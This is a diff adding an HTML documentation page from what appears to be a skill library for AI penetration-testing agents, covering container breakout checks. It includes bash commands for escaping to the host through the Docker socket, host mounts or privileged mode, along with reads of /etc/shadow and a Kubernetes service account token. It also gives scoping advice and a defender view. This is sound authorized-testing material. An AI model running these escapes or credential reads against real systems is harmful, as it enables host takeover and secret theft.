@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: container-breakout-checks</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>container-breakout-checks</h2><div class="meta"><span class="badge gray">privesc</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when your Linux shell is inside a container on an</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="privesc-linux.html">privesc-linux</a></div><div class="deps"><span class="kind">requires:</span> <a href="privesc-linux.html">privesc-linux</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="cloud-security-basics.html">cloud-security-basics</a> <a href="linux-hardening.html">linux-hardening</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Python</td><td>3.12</td></tr><tr><td>Docker</td><td>25.0</td></tr></tbody></table><p>A container is not a security boundary by itself: misconfigured mounts, sockets, and privileges turn container root into host root. This skill covers checking for container escapes on authorized engagements: detecting the container, reviewing its privileges and mounts, and testing the classic escape paths. Breakout attempts target the host, so the approval bar is higher than normal privesc; confirm scope covers the host before testing escapes.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm you are in a container and identify the runtime.</li>
+<li>Check for privileged mode, dangerous capabilities, and host mounts.</li>
+<li>Check for the Docker socket and host PID or network namespaces.</li>
+<li>Test the escape path that matches the misconfiguration, with approval.</li>
+<li>Prove host access minimally (read one host file, run <code>id</code> on the host).</li>
+<li>Report the misconfiguration with the exact settings that allowed it.</li>
+</ol>
+<h2>1. Detection and privilege review</h2>
+<pre><code class="language-bash"># Am I in a container?
+cat /proc/1/cgroup 2&gt;/dev/null | head -5
+ls -la /.dockerenv 2&gt;/dev/null
+cat /proc/self/mountinfo | grep -E &#x27;docker|kubepods&#x27; | head -3
+
+# Privileged mode: full device access means near-certain escape
+ls /dev/ | wc -l  # hundreds of devices suggests --privileged
+cat /proc/self/status | grep -i cap
+capsh --decode=$(grep CapEff /proc/self/status | awk &#x27;{print $2}&#x27;) 2&gt;/dev/null
+
+# Dangerous mounts: host root, docker socket, host proc
+mount | grep -E &#x27; / |docker.sock&#x27;
+ls -la /var/run/docker.sock 2&gt;/dev/null
+cat /proc/self/mountinfo | grep -E &#x27; /host| / &#x27; | head -5</code></pre>
+<p><code>--privileged</code> plus any mount trick equals host root in practice. The Docker socket equals root through container creation. A host-path mount equals direct file access. Rank findings in that order.</p>
+<h2>2. Classic escape paths</h2>
+<pre><code class="language-bash"># Path 1: Docker socket available -&gt; run a privileged container
+# with the host filesystem mounted (needs docker CLI or API access)
+docker run -v /:/host -it alpine chroot /host /bin/bash
+
+# Path 2: host filesystem mounted at /host -&gt; direct access
+ls /host/etc/shadow 2&gt;/dev/null &amp;&amp; echo &quot;HOST FS MOUNTED&quot;
+
+# Path 3: privileged mode -&gt; mount host disk from inside
+fdisk -l 2&gt;/dev/null | head -10
+# mkdir /mnt/host; mount /dev/sda1 /mnt/host
+
+# Path 4: writable hostPath in Kubernetes -&gt; check the mount table
+# and the service account token
+cat /var/run/secrets/kubernetes.io/serviceaccount/token 2&gt;/dev/null | cut -c1-40</code></pre>
+<p>Test the least invasive proof first: reading a host file beats writing one, and listing beats both. Full interactive host shells are rarely needed to prove the finding.</p>
+<h2>3. Kubernetes-specific checks</h2>
+<pre><code class="language-bash"># Service account token and API access
+ls /var/run/secrets/kubernetes.io/serviceaccount/ 2&gt;/dev/null
+# Can the token list secrets cluster-wide? (test read-only)
+kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \
+  auth can-i list secrets --all-namespaces 2&gt;&amp;1 | head -3
+
+# Node access via hostPath or hostNetwork
+cat /proc/self/mountinfo | grep -c &#x27;kubepods&#x27;
+ip addr | grep -E &#x27;inet &#x27; | head -5</code></pre>
+<p>An over-permissioned service account is the Kubernetes equivalent of a SUID binary: enumerate its rights with <code>auth can-i</code> before attempting anything, and report excessive rights as the finding even without exploiting them.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The container is well-configured: no socket, no host mounts, dropped</li>
+<p>capabilities. Report the hardening as positive and move privesc back inside the container (application-layer paths).</p>
+<li>The escape needs the Docker socket but only the API is exposed. The</li>
+<p>socket API over TCP with no auth is equivalent to the socket file.</p>
+<li>AppArmor or seccomp blocks the escape technique. Note the control</li>
+<p>working; try the documented alternative paths once each, then stop.</p>
+<li>You are in a VM, not a container. The cgroup checks distinguish them;</li>
+<p>VM escape is out of scope for this skill and almost every engagement.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Scope does not cover the host: enumerate and report the escape path</li>
+<p>without executing it; the misconfiguration is the finding.</p>
+<li>Scope covers the host: get explicit approval for the specific</li>
+<p>technique, prove access minimally, and avoid host modifications.</p>
+<li>The escape leads to a cluster: hand findings to the cloud review</li>
+<p>(cloud-security-basics) since the blast radius is now the platform.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see breakouts as containers spawning privileged siblings, mounts of host paths, and API calls creating host-mounted pods, all visible in the container runtime audit logs and Kubernetes audit logs. Defenses are no privileged containers, no Docker socket mounts, read-only root filesystems, dropped capabilities, seccomp and AppArmor profiles, and admission controllers that reject hostPath and privileged pods.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1611 (Escape to Host).</li>
+<li>MITRE ATT&amp;CK T1610 (Deploy Container).</li>
+<li>CWE-250 (Execution with Unnecessary Privileges).</li>
+<li>Docker and Kubernetes security best practice documentation.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
